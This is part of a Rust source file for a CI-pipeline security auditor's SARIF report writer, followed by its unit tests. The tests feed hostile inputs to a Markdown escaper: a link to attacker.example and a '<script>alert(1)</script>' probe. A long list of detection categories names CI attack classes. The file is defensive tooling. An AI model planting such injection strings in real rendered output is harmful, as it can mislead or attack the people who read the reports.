    let portal_control_dependency = finding.extras.portal_control_dependency;
    let authority_kinds = finding.extras.authority_kinds.clone();
    let attacker_surface_kinds = finding.extras.attacker_surface_kinds.clone();
    let template_resolution_strength = finding.extras.template_resolution_strength.clone();
    let cve_relationship = finding.extras.cve_relationship.clone();

    // SECURITY: GitHub Code Scanning renders Markdown links in
    // `result.message.text`. `finding.message` is composed from
    // attacker-controllable inputs (custom-rule `name`, node names from
    // pipeline YAML keys). Escape Markdown specials at the render boundary
    // — fingerprints are already computed above against the RAW message,
    // so this escape does NOT shift fingerprints. JSON sink ships raw;
    // only SARIF (Markdown-rendering downstream) escapes.
    let escaped_message = escape_markdown(&finding.message).into_owned();

    SarifResult {
        rule_id,
        level,
        message: SarifMessage {
            text: escaped_message,
        },
        locations: vec![SarifLocation {
            physical_location: SarifPhysicalLocation {
                artifact_location: SarifArtifactLocation {
                    uri,
                    uri_base_id: "%SRCROOT%",
                },
            },
        }],
        properties: SarifResultProperties {
            security_severity,
            taudit_source,
            finding_group_id,
            suppression_key,
            time_to_fix,
            compensating_controls,
            suppressed,
            original_severity,
            suppression_reason,
            confidence_scope,
            runtime_preconditions,
            portal_control_dependency,
            authority_kinds,
            attacker_surface_kinds,
            template_resolution_strength,
            cve_relationship,
        },
        partial_fingerprints: SarifPartialFingerprints {
            // Both keys carry the SAME 32-hex value today. They diverge only
            // when the fingerprint formula bumps in a future major —
            // at which point the second key changes and old
            // suppressions stored against `taudit/v1` correctly fail to
            // carry over. See docs/finding-fingerprint.md.
            primary_location_line_hash: fingerprint.clone(),
            taudit_v1: fingerprint,
        },
    }
}

// `extract_custom_rule_id` and `category_to_rule_id` were workspace
// duplicates of helpers that now live as `taudit_core::finding::rule_id_for`.
// Removed in v1.1.0-beta.3 so JSON, SARIF, baseline, and CloudEvents
// agree on rule-id resolution byte-for-byte. See
// `crates/taudit-core/src/finding.rs::rule_id_for`.

fn severity_to_level(severity: &Severity) -> &'static str {
    match severity {
        Severity::Critical | Severity::High => "error",
        Severity::Medium => "warning",
        Severity::Low | Severity::Info => "note",
    }
}

fn severity_to_security_severity(severity: &Severity) -> &'static str {
    match severity {
        Severity::Critical => "9.0",
        Severity::High => "7.5",
        Severity::Medium => "5.0",
        Severity::Low => "2.0",
        Severity::Info => "0.1",
    }
}

// ── Tests ────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use taudit_core::finding::{
        FindingCategory, FindingExtras, FixEffort, Recommendation, Severity,
    };
    use taudit_core::graph::{AuthorityGraph, PipelineSource};

    // ── escape_markdown unit tests ────────────────────────────

    #[test]
    fn escape_markdown_passes_clean_prose_unchanged() {
        let s = "AWS_KEY reaches deploy across trust boundary";
        let out = escape_markdown(s);
        // Underscores are NOT in our escape set (they're rare in attack
        // strings and common in legitimate identifiers like AWS_KEY); only
        // genuine Markdown link / HTML / emphasis chars trigger escaping.
        assert!(
            matches!(out, Cow::Borrowed(_)),
            "clean input must zero-alloc"
        );
        assert_eq!(out, s);
    }

    #[test]
    fn escape_markdown_neutralises_link_payload() {
        let hostile = "Click [here](https://attacker.example) for context";
        let out = escape_markdown(hostile);
        // Brackets and parens must be backslash-escaped so a Markdown
        // renderer treats them as literals, not link syntax.
        assert!(out.contains("\\["));
        assert!(out.contains("\\]"));
        assert!(out.contains("\\("));
        assert!(out.contains("\\)"));
        // The underlying URL text is preserved (we don't strip — we
        // de-fang the link wrapper).
        assert!(out.contains("https://attacker.example"));
    }

    #[test]
    fn escape_markdown_neutralises_html_tags() {
        let hostile = "<script>alert(1)</script>";
        let out = escape_markdown(hostile);
        assert!(out.contains("\\<"));
        assert!(out.contains("\\>"));
    }

    #[test]
    fn escape_markdown_neutralises_emphasis_and_code() {
        let hostile = "**bold** `code`";
        let out = escape_markdown(hostile);
        assert!(out.contains("\\*"));
        assert!(out.contains("\\`"));
    }

    #[test]
    fn escape_markdown_handles_image_marker() {
        let hostile = "![alt](url)";
        let out = escape_markdown(hostile);
        assert!(out.contains("\\!"));
        assert!(out.contains("\\["));
        assert!(out.contains("\\]"));
        assert!(out.contains("\\("));
        assert!(out.contains("\\)"));
    }

    #[test]
    fn escape_markdown_preserves_legitimate_identifiers() {
        // Underscores and hyphens in identifiers like `AWS_KEY`,
        // `GITHUB_TOKEN`, `my-custom-rule` must NOT be escaped — that
        // would noise up the common-path render of every taudit alert.
        let s = "AWS_KEY reaches deploy via my-custom-rule#42";
        let out = escape_markdown(s);
        assert!(
            matches!(out, Cow::Borrowed(_)),
            "underscore/hyphen/hash must not trigger escape"
        );
        assert_eq!(out, s);
    }
    use taudit_core::ports::ReportSink;

    fn source() -> PipelineSource {
        PipelineSource {
            file: ".github/workflows/ci.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        }
    }

    fn empty_graph() -> AuthorityGraph {
        AuthorityGraph::new(source())
    }

    fn make_finding(severity: Severity, category: FindingCategory, msg: &str) -> Finding {
        Finding {
            severity,
            category,
            path: None,
            nodes_involved: vec![],
            message: msg.to_string(),
            recommendation: Recommendation::Manual {
                action: "review".to_string(),
            },
            source: taudit_core::finding::FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        }
    }

    fn emit_to_string(graph: &AuthorityGraph, findings: &[Finding]) -> serde_json::Value {
        let mut buf = Vec::new();
        SarifReportSink.emit(&mut buf, graph, findings).unwrap();
        serde_json::from_slice(&buf).unwrap()
    }

    #[test]
    fn empty_findings_produces_valid_sarif() {
        let graph = empty_graph();
        let sarif = emit_to_string(&graph, &[]);

        assert_eq!(sarif["version"], "2.1.0");
        assert!(sarif["$schema"].as_str().unwrap().contains("sarif-2.1.0"));
        let results = &sarif["runs"][0]["results"];
        assert_eq!(results.as_array().unwrap().len(), 0);
    }

    #[test]
    fn driver_name_and_rules_present() {
        let graph = empty_graph();
        let sarif = emit_to_string(&graph, &[]);

        let driver = &sarif["runs"][0]["tool"]["driver"];
        assert_eq!(driver["name"], "taudit");

        let rules = driver["rules"].as_array().unwrap();
        assert_eq!(rules.len(), RULE_DEFS.len());

        // Every rule has the required fields
        for rule in rules {
            assert!(rule["id"].is_string());
            assert!(rule["name"].is_string());
            assert!(rule["shortDescription"]["text"].is_string());
            assert!(rule["fullDescription"]["text"].is_string());
            assert!(rule["defaultConfiguration"]["level"].is_string());
            assert!(rule["helpUri"].is_string());
            assert!(rule["properties"]["security-severity"].is_string());
            let tags = rule["properties"]["tags"].as_array().unwrap();
            assert!(
                tags.iter().any(|t| t == "security"),
                "every rule must carry the \"security\" tag"
            );
        }
    }

    #[test]
    fn versioned_emit_stamps_supplied_tool_version() {
        // The CLI passes its own (product) version so SARIF evidence reports the
        // same string as `taudit --version`, not this crate's independent semver.
        let graph = empty_graph();
        let mut buf = Vec::new();
        SarifReportSink
            .emit_multi_with_custom_rules_versioned(&mut buf, &[(&graph, &[])], &[], "9.9.9-test")
            .unwrap();
        let sarif: serde_json::Value = serde_json::from_slice(&buf).unwrap();
        assert_eq!(sarif["runs"][0]["tool"]["driver"]["version"], "9.9.9-test");
    }

    #[test]
    fn severity_maps_to_correct_sarif_level() {
        let graph = empty_graph();
        let findings = vec![
            make_finding(
                Severity::Critical,
                FindingCategory::UnpinnedAction,
                "critical",
            ),
            make_finding(
                Severity::High,
                FindingCategory::OverPrivilegedIdentity,
                "high",
            ),
            make_finding(
                Severity::Medium,
                FindingCategory::AuthorityPropagation,
                "medium",
            ),
            make_finding(Severity::Low, FindingCategory::LongLivedCredential, "low"),
            make_finding(Severity::Info, FindingCategory::FloatingImage, "info"),
        ];

        let sarif = emit_to_string(&graph, &findings);
        let results = sarif["runs"][0]["results"].as_array().unwrap();

        assert_eq!(results[0]["level"], "error"); // Critical
        assert_eq!(results[1]["level"], "error"); // High
        assert_eq!(results[2]["level"], "warning"); // Medium
        assert_eq!(results[3]["level"], "note"); // Low
        assert_eq!(results[4]["level"], "note"); // Info

        // security-severity mirrors the finding severity, not the rule default
        assert_eq!(results[0]["properties"]["security-severity"], "9.0");
        assert_eq!(results[1]["properties"]["security-severity"], "7.5");
        assert_eq!(results[2]["properties"]["security-severity"], "5.0");
        assert_eq!(results[3]["properties"]["security-severity"], "2.0");
        assert_eq!(results[4]["properties"]["security-severity"], "0.1");
    }

    #[test]
    fn result_has_rule_id_message_and_location() {
        let graph = empty_graph();
        let findings = vec![make_finding(
            Severity::High,
            FindingCategory::UnpinnedAction,
            "Unpinned actions/checkout@v4",
        )];

        let sarif = emit_to_string(&graph, &findings);
        let r = &sarif["runs"][0]["results"][0];

        assert_eq!(r["ruleId"], "unpinned_action");
        assert_eq!(r["message"]["text"], "Unpinned actions/checkout@v4");

        let uri = &r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"];
        assert_eq!(uri, ".github/workflows/ci.yml");

        let base = &r["locations"][0]["physicalLocation"]["artifactLocation"]["uriBaseId"];
        assert_eq!(base, "%SRCROOT%");

        // Every result has a stable partialFingerprint for cross-run dedup.
        let fp = r["partialFingerprints"]["primaryLocationLineHash"]
            .as_str()
            .unwrap();
        assert_eq!(
            fp.len(),
            32,
            "fingerprint should be 32 hex chars (v3 = 128-bit)"
        );
        assert!(fp.chars().all(|c| c.is_ascii_hexdigit()));

        // The tool-namespaced `taudit/v1` key MUST also be present and
        // byte-identical to `primaryLocationLineHash` today. The version
        // suffix is what signals "old suppressions don't carry over" if
        // a future major bumps the fingerprint formula.
        // See docs/finding-fingerprint.md § "SARIF baseline integration".
        let tv1 = r["partialFingerprints"]["taudit/v1"]
            .as_str()
            .expect("partialFingerprints must include taudit/v1");
        assert_eq!(
            tv1, fp,
            "taudit/v1 must be byte-identical to primaryLocationLineHash within the v1 major"
        );
        assert_eq!(tv1.len(), 32);
        assert!(tv1.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn sarif_projects_public_finding_extras_and_omits_raw_fingerprint_anchor() {
        let graph = empty_graph();
        let mut finding = make_finding(
            Severity::Medium,
            FindingCategory::AuthorityPropagation,
            "helper path authority is inferred from source facts",
        );
        finding.extras = FindingExtras {
            finding_group_id: Some("group-rc-l5-03".to_string()),
            time_to_fix: Some(FixEffort::Small),
            compensating_controls: vec!["job-level permissions narrowed".to_string()],
            suppressed: true,
            original_severity: Some(Severity::High),
            suppression_reason: Some("accepted during migration window".to_string()),
            fingerprint_anchor: Some("workflow:deploy:helper-path".to_string()),
            confidence_scope: Some("yaml_only".to_string()),
            runtime_preconditions: vec!["repository allows workflow write token".to_string()],
            portal_control_dependency: true,
            authority_kinds: vec!["job_token".to_string(), "secret".to_string()],
            attacker_surface_kinds: vec!["mutable_dependency_ref".to_string()],
            template_resolution_strength: Some("partial".to_string()),
            cve_relationship: Some("analogue_only".to_string()),
        };

        let sarif = emit_to_string(&graph, &[finding]);
        let result = &sarif["runs"][0]["results"][0];
        let properties = result["properties"]
            .as_object()
            .expect("SARIF result properties should be an object");

        assert_eq!(properties["findingGroupId"], "group-rc-l5-03");
        assert!(properties["suppressionKey"]
            .as_str()
            .expect("suppressionKey")
            .starts_with("sk1_"));
        assert_eq!(properties["timeToFix"], "small");
        assert_eq!(
            properties["compensatingControls"]
                .as_array()
                .expect("compensatingControls"),
            &[serde_json::json!("job-level permissions narrowed")]
        );
        assert_eq!(properties["suppressed"], true);
        assert_eq!(properties["originalSeverity"], "high");
        assert_eq!(
            properties["suppressionReason"],
            "accepted during migration window"
        );
        assert_eq!(properties["confidenceScope"], "yaml_only");
        assert_eq!(
            properties["runtimePreconditions"]
                .as_array()
                .expect("runtimePreconditions"),
            &[serde_json::json!("repository allows workflow write token")]
        );
        assert_eq!(properties["portalControlDependency"], true);
        assert_eq!(
            properties["authorityKinds"]
                .as_array()
                .expect("authorityKinds"),
            &[serde_json::json!("job_token"), serde_json::json!("secret")]
        );
        assert_eq!(
            properties["attackerSurfaceKinds"]
                .as_array()
                .expect("attackerSurfaceKinds"),
            &[serde_json::json!("mutable_dependency_ref")]
        );
        assert_eq!(properties["templateResolutionStrength"], "partial");
        assert_eq!(properties["cveRelationship"], "analogue_only");
        assert!(
            !properties.contains_key("fingerprintAnchor"),
            "fingerprint_anchor is consumed by fingerprint/suppression identity, not projected raw"
        );
    }

    #[test]
    fn sarif_public_extra_map_documents_projection_decisions() {
        let repo_root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
        if !repo_root.join("Cargo.toml").exists() {
            return;
        }
        let path = repo_root.join("docs/rc/v1.2.0/sarif-public-extra-map.md");
        let doc = std::fs::read_to_string(&path)
            .unwrap_or_else(|err| panic!("{}: {err}", path.display()));

        for field in [
            "rule_id",
            "fingerprint",
            "suppression_key",
            "finding_group_id",
            "source",
            "time_to_fix",
            "compensating_controls",
            "suppressed",
            "original_severity",
            "suppression_reason",
            "fingerprint_anchor",
            "confidence_scope",
            "runtime_preconditions",
            "portal_control_dependency",
            "authority_kinds",
            "attacker_surface_kinds",
            "template_resolution_strength",
            "cve_relationship",
            "ordered_authority_evidence",
        ] {
            assert!(
                doc.contains(field),
                "missing projection decision for {field}"
            );
        }

        for property in [
            "result.ruleId",
            "partialFingerprints.primaryLocationLineHash",
            "properties.suppressionKey",
            "properties.findingGroupId",
            "properties.suppressionReason",
            "Non-projected",
        ] {
            assert!(
                doc.contains(property),
                "missing SARIF mapping text for {property}"
            );
        }
    }

    #[test]
    fn all_finding_categories_have_rule_definitions() {
        // Ensures no category falls back to ruleId="unknown", which breaks
        // GitHub Code Scanning ingestion.
        let categories = [
            FindingCategory::AuthorityPropagation,
            FindingCategory::OverPrivilegedIdentity,
            FindingCategory::UnpinnedAction,
            FindingCategory::UntrustedWithAuthority,
            FindingCategory::ArtifactBoundaryCrossing,
            FindingCategory::FloatingImage,
            FindingCategory::LongLivedCredential,
            FindingCategory::PersistedCredential,
            FindingCategory::TriggerContextMismatch,
            FindingCategory::CrossWorkflowAuthorityChain,
            FindingCategory::AuthorityCycle,
            FindingCategory::UpliftWithoutAttestation,
            FindingCategory::SelfMutatingPipeline,
            FindingCategory::VariableGroupInPrJob,
            FindingCategory::SelfHostedPoolPrHijack,
            FindingCategory::ServiceConnectionScopeMismatch,
            FindingCategory::TemplateExtendsUnpinnedBranch,
            FindingCategory::TemplateRepoRefIsFeatureBranch,
            FindingCategory::VmRemoteExecViaPipelineSecret,
            FindingCategory::ShortLivedSasInCommandLine,
            FindingCategory::SecretToInlineScriptEnvExport,
            FindingCategory::SecretMaterialisedToWorkspaceFile,
            FindingCategory::KeyVaultSecretToPlaintext,
            FindingCategory::TerraformAutoApproveInProd,
            FindingCategory::AddSpnWithInlineScript,
            FindingCategory::ParameterInterpolationIntoShell,
            FindingCategory::RuntimeScriptFetchedFromFloatingUrl,
            FindingCategory::PrTriggerWithFloatingActionRef,
            FindingCategory::UntrustedApiResponseToEnvSink,
            FindingCategory::PrBuildPushesImageWithFloatingCredentials,
            FindingCategory::SecretViaEnvGateToUntrustedConsumer,
            FindingCategory::TerraformOutputViaSetvariableShellExpansion,
            FindingCategory::RiskyTriggerWithAuthority,
            FindingCategory::SensitiveValueInJobOutput,
            FindingCategory::ManualDispatchInputToUrlOrCommand,
            FindingCategory::SecretsInheritOverscopedPassthrough,
            FindingCategory::UnsafePrArtifactInWorkflowRunConsumer,
            FindingCategory::ScriptInjectionViaUntrustedContext,
            FindingCategory::InteractiveDebugActionInAuthorityWorkflow,
            FindingCategory::PrSpecificCacheKeyInDefaultBranchConsumer,
            FindingCategory::GhCliWithDefaultTokenEscalating,
            FindingCategory::GhaScriptInjectionToPrivilegedShell,
            FindingCategory::GhaWorkflowRunArtifactPoisoningToPrivilegedConsumer,
            FindingCategory::GhaRemoteScriptInAuthorityJob,
            FindingCategory::GhaPatRemoteUrlWrite,
            FindingCategory::GhaIssueCommentCommandToWriteToken,
            FindingCategory::GhaPrBuildPushesPublishableImage,
            FindingCategory::GhaManualDispatchRefToPrivilegedCheckout,
            FindingCategory::CiJobTokenToExternalApi,
            FindingCategory::IdTokenAudienceOverscoped,
            FindingCategory::UntrustedCiVarInShellInterpolation,
            FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
            FindingCategory::DindServiceGrantsHostAuthority,
            FindingCategory::SecurityJobSilentlySkipped,
            FindingCategory::ChildPipelineTriggerInheritsAuthority,
            FindingCategory::CacheKeyCrossesTrustBoundary,
            FindingCategory::PatEmbeddedInGitRemoteUrl,
            FindingCategory::CiTokenTriggersDownstreamWithVariablePassthrough,
            FindingCategory::DotenvArtifactFlowsToPrivilegedDeployment,
            FindingCategory::SetvariableIssecretFalse,
            FindingCategory::HomoglyphInActionRef,
            FindingCategory::GhaHelperPathSensitiveArgv,
            FindingCategory::GhaHelperPathSensitiveStdin,
            FindingCategory::GhaHelperPathSensitiveEnv,
            FindingCategory::GhaPostAmbientEnvCleanupPath,
            FindingCategory::GhaActionMintedSecretToHelper,
            FindingCategory::GhaHelperUntrustedPathResolution,
            FindingCategory::GhaSecretOutputAfterHelperLogin,
            FindingCategory::LaterSecretMaterializedAfterPathMutation,
            FindingCategory::GhaSetupNodeCacheHelperPathHandoff,
            FindingCategory::GhaSetupPythonCacheHelperPathHandoff,
            FindingCategory::GhaSetupPythonPipInstallAuthorityEnv,
            FindingCategory::GhaSetupGoCacheHelperPathHandoff,
            FindingCategory::GhaDockerSetupQemuPrivilegedDockerHelper,
            FindingCategory::GhaToolInstallerThenShellHelperAuthority,
            FindingCategory::GhaWorkflowShellAuthorityConcentration,
            FindingCategory::GhaActionTokenEnvBeforeBareDownloadHelper,
            FindingCategory::GhaPostActionInputRetargetToCacheSave,
            FindingCategory::GhaTerraformWrapperSensitiveOutput,
            FindingCategory::GhaCompositeBareHelperAfterPathInstallWithSecretEnv,
            FindingCategory::GhaPulumiPathResolvedCliWithAuthority,
            FindingCategory::GhaPypiPublishOidcAfterPathMutation,
            FindingCategory::GhaChangesetsPublishCommandWithAuthority,
            FindingCategory::GhaRubygemsReleaseGitTokenAndOidcHelper,
            FindingCategory::GhaCompositeEntrypointPathShadowWithSecretEnv,
            FindingCategory::GhaDockerBuildxAuthorityPathHandoff,
            FindingCategory::GhaGoogleDeployGcloudCredentialPath,
            FindingCategory::GhaDatadogTestVisibilityInstallerAuthority,
            FindingCategory::GhaKubernetesHelperKubeconfigAuthority,
            FindingCategory::GhaAzureCompanionHelperAuthority,
            FindingCategory::GhaCreatePrGitTokenPathHandoff,
            FindingCategory::GhaImportGpgPrivateKeyHelperPath,
            FindingCategory::GhaSshAgentPrivateKeyToPathHelper,
            FindingCategory::GhaMacosCodesignCertSecurityPath,
            FindingCategory::GhaPagesDeployTokenUrlToGitHelper,
            FindingCategory::GhaManifestNpmLifecycleHookPrTriggerWithToken,
            FindingCategory::GhaManifestPythonMBuildWithPrCredentials,
            FindingCategory::GhaManifestCargoBuildRsPullRequestWithToken,
            FindingCategory::GhaManifestMakefileWithPrTriggerAndSecrets,
            FindingCategory::GhaManifestSubmodulesRecursiveWithPrAuthority,
            FindingCategory::GhaCrossrepoWorkflowCallFloatingRefCascade,
            FindingCategory::GhaCrossrepoSecretsInheritUnreviewedCallee,
            FindingCategory::GhaToolcacheAbsolutePathDowngrade,
        ];

        for cat in categories {
            // Build a synthetic finding so we can route through the
            // workspace-canonical rule-id resolver. Using `rule_id_for`
            // instead of a now-deleted local `category_to_rule_id` keeps
            // JSON / SARIF / CloudEvents on the same code path.
            let synthetic = Finding {
                severity: Severity::High,
                category: cat,
                path: None,
                nodes_involved: vec![],
                message: String::new(),
                recommendation: taudit_core::finding::Recommendation::Manual {
                    action: "n/a".into(),
                },
                source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
            };
            let id = rule_id_for(&synthetic);
            assert!(
                RULE_DEFS.iter().any(|r| r.id == id),
                "category {cat:?} -> rule id {id:?} has no RuleDef entry"
            );
        }
    }

    #[test]
    fn emit_multi_produces_single_sarif_document() {
        let source_a = PipelineSource {
            file: ".github/workflows/ci.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        };
        let source_b = PipelineSource {
            file: ".github/workflows/deploy.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        };
        let graph_a = AuthorityGraph::new(source_a);
        let graph_b = AuthorityGraph::new(source_b);

        let findings_a = vec![make_finding(
            Severity::High,
            FindingCategory::UnpinnedAction,
            "Unpinned checkout in ci",
        )];
        let findings_b = vec![make_finding(
            Severity::Critical,
            FindingCategory::AuthorityPropagation,
            "Secret reaches untrusted step in deploy",
        )];

        let mut buf = Vec::new();
        SarifReportSink
            .emit_multi(
                &mut buf,
                &[
                    (&graph_a, findings_a.as_slice()),
                    (&graph_b, findings_b.as_slice()),
                ],
            )
            .unwrap();

        // Must be a single valid JSON document — not two concatenated ones.
        let sarif: serde_json::Value = serde_json::from_slice(&buf)
            .expect("emit_multi must produce a single valid JSON document");

        assert_eq!(sarif["version"], "2.1.0");

        // One run containing both files' results.
        let runs = sarif["runs"].as_array().unwrap();
        assert_eq!(runs.len(), 1, "expected exactly one run");

        let results = runs[0]["results"].as_array().unwrap();
        assert_eq!(results.len(), 2, "expected both files' findings in one run");

        let uris: Vec<&str> = results
            .iter()
            .map(|r| {
                r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                    .as_str()
                    .unwrap()
            })
            .collect();
        assert!(uris.contains(&".github/workflows/ci.yml"));
        assert!(uris.contains(&".github/workflows/deploy.yml"));
    }

    /// Mirror of `taudit-report-json::tests::json_output_is_byte_deterministic_across_runs`.
    /// SARIF processes the same `AuthorityGraph` and the same HashMap-iteration
    /// class of bug that hit JSON in B1 (v0.9.1 fuzz) could regress here too —
    /// any leak of HashMap order into node IDs, edge endpoints, metadata key
    /// ordering, or fingerprint inputs would make consecutive emissions of the
    /// same graph diverge byte-for-byte. Build a metadata-rich graph and emit
    /// 9× in sequence; assert all 9 outputs are byte-equal.
    #[test]
    fn sarif_output_is_byte_deterministic_across_runs() {
        use std::collections::HashMap;
        use taudit_core::graph::{EdgeKind, NodeKind, TrustZone};

        fn build_graph() -> (AuthorityGraph, Vec<Finding>) {
            let mut graph = AuthorityGraph::new(PipelineSource {
                file: "ci.yml".into(),
                repo: None,
                git_ref: None,
                commit_sha: None,
            });
            let secret_a = graph.add_node(NodeKind::Secret, "AWS_KEY", TrustZone::FirstParty);
            let secret_b = graph.add_node(NodeKind::Secret, "DEPLOY_TOKEN", TrustZone::FirstParty);
            let step = graph.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
            graph.add_edge(step, secret_a, EdgeKind::HasAccessTo);
            graph.add_edge(step, secret_b, EdgeKind::HasAccessTo);
            if let Some(node) = graph.nodes.get_mut(step) {
                let mut meta: HashMap<String, String> = HashMap::new();
                meta.insert("z_field".into(), "z".into());
                meta.insert("a_field".into(), "a".into());
                meta.insert("m_field".into(), "m".into());
                meta.insert("k_field".into(), "k".into());
                meta.insert("c_field".into(), "c".into());
                node.metadata = meta;
            }
            graph
                .metadata
                .insert("trigger".into(), "pull_request".into());
            graph.metadata.insert("platform".into(), "github".into());
            let findings = vec![Finding {
                severity: Severity::High,
                category: FindingCategory::AuthorityPropagation,
                path: None,
                nodes_involved: vec![secret_a, step],
                message: "AWS_KEY reaches deploy".into(),
                recommendation: Recommendation::Manual {
                    action: "scope it".into(),
                },
                source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
            }];
            (graph, findings)
        }

        let mut runs: Vec<Vec<u8>> = Vec::with_capacity(9);
        for _ in 0..9 {
            let (g, f) = build_graph();
            let mut buf = Vec::new();
            SarifReportSink.emit(&mut buf, &g, &f).unwrap();
            runs.push(buf);
        }

        let first = &runs[0];
        for (i, run) in runs.iter().enumerate().skip(1) {
            assert_eq!(
                first, run,
                "run 0 and run {i} produced byte-different SARIF output (non-determinism regression)"
            );
        }
    }
}
